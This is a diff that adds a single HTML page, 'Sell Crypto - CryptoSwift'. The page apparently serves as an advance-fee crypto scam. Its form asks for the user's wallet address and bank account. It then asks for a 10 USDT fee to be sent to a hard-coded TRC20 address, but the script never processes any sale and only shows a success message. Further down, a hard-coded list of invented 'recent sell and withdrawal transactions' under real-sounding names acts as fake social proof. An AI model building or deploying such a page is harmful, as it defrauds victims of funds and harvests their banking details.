@@ -1,0 +1,333 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <title>Sell Crypto - CryptoSwift</title>
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <style>
+    body {
+      background-color: #111;
+      color: #eee;
+      font-family: 'Segoe UI', sans-serif;
+      display: flex;
+      flex-direction: column;
+      align-items: center;
+      justify-content: start;
+      min-height: 100vh;
+      padding: 20px;
+    }
+
+    .wallet-header {
+      width: 100%;
+      max-width: 600px;
+      background: #222;
+      padding: 15px;
+      text-align: center;
+      border-radius: 10px;
+      margin-top: 10px;
+      box-shadow: 0 0 10px rgba(0,0,0,0.3);
+      color: #00ffcc;
+      font-weight: bold;
+      font-size: 18px;
+    }
+
+    h2 {
+      color: #f06292;
+      margin-top: 30px;
+    }
+
+    form {
+      background: #1e1e1e;
+      padding: 30px;
+      border-radius: 10px;
+      max-width: 500px;
+      width: 100%;
+      box-shadow: 0 0 15px rgba(0,0,0,0.4);
+      margin-top: 20px;
+    }
+
+    label {
+      display: block;
+      margin: 12px 0 6px;
+      color: #bbb;
+    }
+
+    select, input {
+      width: 100%;
+      padding: 12px;
+      margin-bottom: 10px;
+      background: #2c2c2c;
+      border: none;
+      border-radius: 6px;
+      color: #fff;
+    }
+
+    button {
+      background-color: #f06292;
+      color: #000;
+      padding: 12px;
+      width: 100%;
+      border: none;
+      border-radius: 6px;
+      font-weight: bold;
+      cursor: pointer;
+      margin-top: 10px;
+    }
+
+    .total-box {
+      background-color: #2c2c2c;
+      padding: 10px;
+      border-radius: 6px;
+      margin-top: 10px;
+      text-align: center;
+      font-size: 18px;
+      color: #f06292;
+    }
+
+    .success, .fee-instruction {
+      margin-top: 15px;
+      color: lightgreen;
+      font-weight: bold;
+      display: none;
+    }
+
+    .fee-instruction {
+      background: #222;
+      padding: 10px;
+      border-radius: 8px;
+      font-size: 15px;
+      line-height: 1.6;
+    }
+
+    .fee-instruction span {
+      color: #00ffcc;
+    }
+  </style>
+</head>
+<body>
+
+  <div class="wallet-header">
+    Crypto Wallet Balance: $0.00
+  </div>
+
+  <h2>Sell Cryptocurrency</h2>
+
+  <form onsubmit="return handleSell()">
+    <label for="crypto">Select Crypto</label>
+    <select id="crypto" onchange="updateSellRate()">
+      <option value="BTC">Bitcoin (BTC)</option>
+      <option value="ETH">Ethereum (ETH)</option>
+      <option value="USDT">Tether (USDT)</option>
+      <option value="BNB">Binance Coin (BNB)</option>
+    </select>
+
+    <label for="amount">Amount to Sell</label>
+    <input type="number" id="amount" placeholder="Enter amount" required oninput="calculateSellTotal()">
+
+    <label for="wallet">Your Wallet Address (sending from)</label>
+    <input type="text" id="wallet" placeholder="Your crypto wallet address" required>
+
+    <label for="bank">Your Bank Account (to receive funds)</label>
+    <input type="text" id="bank" placeholder="Bank name and account number" required>
+
+    <div class="total-box" id="totalBox">You will receive: $0.00</div>
+
+    <button type="submit">Confirm Sale</button>
+
+    <div class="fee-instruction" id="feeInstruction">
+      To proceed with the sale, you must first pay a transaction fee of <span>10 USDT</span> via <strong>TRC20 Network</strong>.<br>
+      Send the fee to this wallet address:<br>
+      <span>TB4YyUMmFV8NK1GqZyWkENNPAkPbDf7sCv</span><br><br>
+      After sending, click <strong>Confirm Sale</strong> again.
+    </div>
+
+    <div class="success" id="successMsg">Transaction complete! Your sale will be processed shortly.</div>
+  </form>
+
+  <script>
+    const sellRates = {
+      BTC: 60000,
+      ETH: 3000,
+      USDT: 1,
+      BNB: 350
+    };
+
+    let selectedCrypto = 'BTC';
+    let feeStepShown = false;
+
+    function updateSellRate() {
+      selectedCrypto = document.getElementById("crypto").value;
+      calculateSellTotal();
+    }
+
+    function calculateSellTotal() {
+      const amount = parseFloat(document.getElementById("amount").value) || 0;
+      const rate = sellRates[selectedCrypto];
+      const total = amount * rate;
+      document.getElementById("totalBox").textContent = `You will receive: $${total.toFixed(2)}`;
+    }
+
+    function handleSell() {
+      const amount = document.getElementById("amount").value;
+      const wallet = document.getElementById("wallet").value;
+      const bank = document.getElementById("bank").value;
+
+      if (!amount || !wallet || !bank) {
+        alert("Please fill out all fields.");
+        return false;
+      }
+
+      if (!feeStepShown) {
+        document.getElementById("feeInstruction").style.display = "block";
+        feeStepShown = true;
+        return false;
+      }
+
+      document.getElementById("successMsg").style.display = "block";
+      setTimeout(() => {
+        window.location.href = "crypto.html";
+      }, 4000);
+      return false;
+    }
+  </script><br><br><hr>
+
+
+<div class="user-transactions">
+    <h3>Recent Sell & Withdrawal Transactions</h3>
+    <div class="marquee-container">
+        <div class="marquee-content">
+            <!-- Transaction items will be added here dynamically -->
+        </div>
+    </div>
+</div>
+
+<script>
+    const users = [
+        { name: "John Doe", country: "USA", amount: "1.2 BTC", status: "Sold" },
+        { name: "Jane Smith", country: "Canada", amount: "2000 USDT", status: "Withdrew" },
+        { name: "Carlos Ruiz", country: "Spain", amount: "0.5 ETH", status: "Sold" },
+        { name: "Linda Li", country: "China", amount: "3000 USDT", status: "Withdrew" },
+        { name: "Siti Aminah", country: "Malaysia", amount: "0.8 BTC", status: "Sold" },
+        { name: "Ravi Kumar", country: "India", amount: "1500 USDT", status: "Withdrew" },
+        { name: "Emeka Okoro", country: "Nigeria", amount: "2.5 ETH", status: "Sold" },
+        { name: "Ahmed Al-Farsi", country: "Saudi Arabia", amount: "1000 USDT", status: "Withdrew" },
+        { name: "Maria Gonzalez", country: "Argentina", amount: "1.3 BTC", status: "Sold" },
+        { name: "Olga Petrova", country: "Russia", amount: "5000 USDT", status: "Withdrew" },
+        { name: "Kofi Mensah", country: "Ghana", amount: "0.4 ETH", status: "Sold" },
+        { name: "Aisha Mohammed", country: "Egypt", amount: "1000 USDT", status: "Withdrew" },
+        { name: "Michele Bianchi", country: "Italy", amount: "2.0 BTC", status: "Sold" },
+        { name: "Pedro Alvarez", country: "Mexico", amount: "0.9 ETH", status: "Withdrew" },
+        { name: "Mark Johnson", country: "UK", amount: "3.0 USDT", status: "Sold" },
+        { name: "Maria Souza", country: "Brazil", amount: "2500 USDT", status: "Withdrew" },
+        { name: "James Williams", country: "USA", amount: "0.2 BTC", status: "Sold" },
+        { name: "Farida Khalil", country: "Egypt", amount: "700 USDT", status: "Withdrew" },
+        { name: "David Nwachukwu", country: "Nigeria", amount: "3.0 ETH", status: "Sold" },
+        { name: "Kim Jong", country: "South Korea", amount: "4000 USDT", status: "Withdrew" },
+        { name: "Victor Kabore", country: "Burkina Faso", amount: "0.3 BTC", status: "Sold" },
+        { name: "Sofia Larios", country: "Chile", amount: "5000 USDT", status: "Withdrew" },
+        { name: "Tariq Khan", country: "Pakistan", amount: "1.1 ETH", status: "Sold" },
+        { name: "Lucia Lopez", country: "Spain", amount: "2.0 BTC", status: "Withdrew" },
+        { name: "Peter Zhang", country: "China", amount: "1500 USDT", status: "Sold" },
+        { name: "Nina Kim", country: "South Korea", amount: "2.0 ETH", status: "Withdrew" },
+        { name: "Samuel Akinwunmi", country: "Nigeria", amount: "0.5 BTC", status: "Sold" },
+        { name: "Hannah Davies", country: "Australia", amount: "1000 USDT", status: "Withdrew" },
+        { name: "Alessandro Rossi", country: "Italy", amount: "0.7 ETH", status: "Sold" },
+        { name: "Tom Hardy", country: "UK", amount: "500 USDT", status: "Withdrew" },
+        { name: "Diana Mwangi", country: "Kenya", amount: "2000 USDT", status: "Sold" }
+    ];
+
+    function displayTransactions() {
+        const marqueeContent = document.querySelector('.marquee-content');
+        marqueeContent.innerHTML = ''; // Clear existing content
+
+        users.forEach(user => {
+            const transactionItem = document.createElement('div');
+            transactionItem.classList.add('transaction-item');
+            transactionItem.style.opacity = '0'; // Start with hidden opacity
+
+            const userInfo = document.createElement('div');
+            userInfo.classList.add('user-info');
+            userInfo.textContent = `${user.name} (${user.country})`;
+
+            const transactionDetails = document.createElement('div');
+            transactionDetails.classList.add('transaction-details');
+            transactionDetails.textContent = `${user.amount} - ${user.status}`;
+
+            transactionItem.appendChild(userInfo);
+            transactionItem.appendChild(transactionDetails);
+
+            marqueeContent.appendChild(transactionItem);
+
+            // Fade in each transaction item
+            setTimeout(() => {
+                transactionItem.style.transition = 'opacity 1s ease-in-out';
+                transactionItem.style.opacity = '1'; // Fade in
+            }, 200);
+        });
+    }
+
+    displayTransactions();
+</script>
+
+<style>
+    .user-transactions {
+        width: 100%;
+        max-width: 900px;
+        margin: 20px auto;
+        background-color: #333;
+        padding: 20px;
+        border-radius: 10px;
+        box-shadow: 0 4px 6px rgba(0, 0, 0, 0.1);
+        color: #fff;
+    }
+
+    .user-transactions h3 {
+        text-align: center;
+        font-size: 1.5em;
+        margin-bottom: 20px;
+    }
+
+    .marquee-container {
+        height: 300px;
+        overflow-y: scroll;
+        margin-top: 10px;
+    }
+
+    .marquee-content {
+        display: flex;
+        flex-direction: column;
+        gap: 20px;
+    }
+
+    .transaction-item {
+        display: flex;
+        flex-direction: column;
+        justify-content: center;
+        padding: 15px;
+        background-color: #444;
+        border-radius: 10px;
+        box-shadow: 0 2px 5px rgba(0, 0, 0, 0.1);
+        opacity: 0;
+    }
+
+    .transaction-item:hover {
+        background-color: #555;
+    }
+
+    .user-info {
+        font-weight: bold;
+        color: #fff;
+        font-size: 1.1em;
+    }
+
+    .transaction-details {
+        font-weight: bold;
+        margin-top: 5px;
+        color: #ccc;
+        font-size: 1em;
+    }
+</style>
+
+
+</body>
+</html>
